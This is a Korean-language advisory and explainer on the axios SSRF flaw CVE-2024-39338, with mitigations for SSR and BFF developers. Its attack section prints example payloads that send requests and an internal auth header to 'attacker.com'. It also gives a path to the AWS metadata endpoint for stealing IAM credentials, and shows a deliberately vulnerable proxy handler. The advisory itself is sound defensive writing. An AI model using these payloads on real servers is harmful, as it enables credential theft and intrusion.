# CVE-2024-39338 - axios SSRF via Relative URL

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2024-39338 |
| CVSS | 7.5 (High) |
| 영향 패키지 | axios |
| 영향 버전 | 1.3.2 ~ 1.7.2 |
| 수정 버전 | 1.7.3 |
| 공격 유형 | SSRF (Server-Side Request Forgery) |
| 발견일 | 2024-08-12 |

## 왜 프론트엔드 개발자가 알아야 하는가

axios는 JavaScript/TypeScript 생태계에서 가장 인기 있는 HTTP 클라이언트다. 주간 4,000만+ 다운로드를 기록하며, 대부분의 프론트엔드 프로젝트에서 사용된다:

- Next.js getServerSideProps / API Routes
- Nuxt.js 서버 미들웨어
- Express BFF에서의 API 프록시
- SSR 데이터 페칭

이 취약점은 **서버사이드**에서 axios를 사용할 때, 상대 URL이 의도치 않게 프로토콜-상대(protocol-relative) URL로 해석되어 SSRF가 발생한다.

## 취약점 기술 분석

axios는 `baseURL`과 상대 경로를 결합할 때, path-relative URL(`/path`)과 protocol-relative URL(`//host/path`)을 구분하는 로직에 결함이 있었다.

```javascript
// axios 내부 URL 결합 로직 (단순화)
function combineURLs(baseURL, relativeURL) {
  // baseURL: 'https://api.myapp.com'
  // relativeURL: '//evil.com/path'
  
  // 의도: baseURL + relativeURL = 'https://api.myapp.com//evil.com/path'
  // 실제: '//evil.com/path'가 protocol-relative URL로 해석됨
  //       → 'https://evil.com/path'로 요청이 전송됨!
}
```

경로가 `//`로 시작하면 이를 protocol-relative URL로 처리하여, baseURL을 무시하고 공격자 서버로 요청을 보낸다.

## 공격 시나리오

```javascript
const axios = require('axios');

// BFF에서 baseURL을 설정하고 사용자 입력을 경로로 사용
const api = axios.create({
  baseURL: 'https://internal-api.mycompany.com',
  headers: { 'X-Internal-Auth': 'secret-key' }
});

// 사용자 요청 처리
app.get('/proxy', async (req, res) => {
  const path = req.query.path; // 사용자 입력
  
  // 개발자 의도: internal-api.mycompany.com/users/123
  // 공격 입력: path = "//attacker.com/collect"
  const response = await api.get(path);
  // → https://attacker.com/collect 로 요청 전송!
  // → X-Internal-Auth 헤더가 공격자에게 노출!
  
  res.json(response.data);
});

// 공격 URL:
// https://myapp.com/proxy?path=//attacker.com/steal
```

더 위험한 시나리오 - AWS 메타데이터 접근:
```javascript
// path = "//169.254.169.254/latest/meta-data/iam/security-credentials/"
// → AWS IAM 자격 증명 탈취
```

## 방어 방법

### 즉시 조치
```bash
npm install axios@1.7.3
```

### 코드 레벨 방어
```javascript
// ✅ 경로 입력 검증
function sanitizePath(path) {
  // protocol-relative URL 차단
  if (path.startsWith('//')) {
    throw new Error('Invalid path');
  }
  // 절대 URL 차단
  if (/^https?:\/\//i.test(path)) {
    throw new Error('Invalid path');
  }
  // 경로가 /로 시작하도록 정규화
  return path.startsWith('/') ? path : '/' + path;
}

app.get('/proxy', async (req, res) => {
  const path = sanitizePath(req.query.path);
  const response = await api.get(path);
  res.json(response.data);
});

// ✅ axios 인터셉터로 요청 URL 검증
api.interceptors.request.use((config) => {
  const url = new URL(config.url, config.baseURL);
  const allowed = ['internal-api.mycompany.com'];
  if (!allowed.includes(url.hostname)) {
    throw new Error(`차단된 호스트: ${url.hostname}`);
  }
  return config;
});
```

### 장기 전략
- 사용자 입력을 URL 경로로 사용하는 패턴을 최소화
- API 프록시 패턴 사용 시 허용 경로를 화이트리스트로 관리
- 서버의 아웃바운드 네트워크를 제한 (내부 서비스만 허용)

## 교훈 & 프론트엔드 적용 포인트

1. **클라이언트 라이브러리의 서버사이드 사용은 다른 위협 모델이 필요하다**: 브라우저에서 안전한 것이 서버에서도 안전한 것은 아니다.
2. **URL 결합은 보안에 민감한 연산이다**: 단순 문자열 이어붙이기가 아닌, 구조적 URL 처리가 필요하다.
3. **SSR/BFF에서 사용자 입력 → HTTP 요청 경로 패턴은 위험하다**: 항상 입력을 검증하고 아웃바운드 대상을 제한하라.
4. **axios 인터셉터를 방어 도구로 활용하라**: 모든 요청을 검사하는 중앙화된 검증 포인트로 사용 가능하다.

## 참고 자료

- [NVD - CVE-2024-39338](https://nvd.nist.gov/vuln/detail/CVE-2024-39338)
- [GitHub Advisory - GHSA-8hc4-vh64-cxmj](https://github.com/advisories/GHSA-8hc4-vh64-cxmj)
- [axios Issue #6463](https://github.com/axios/axios/issues/6463)
- [JeffHacks Advisory](https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html)
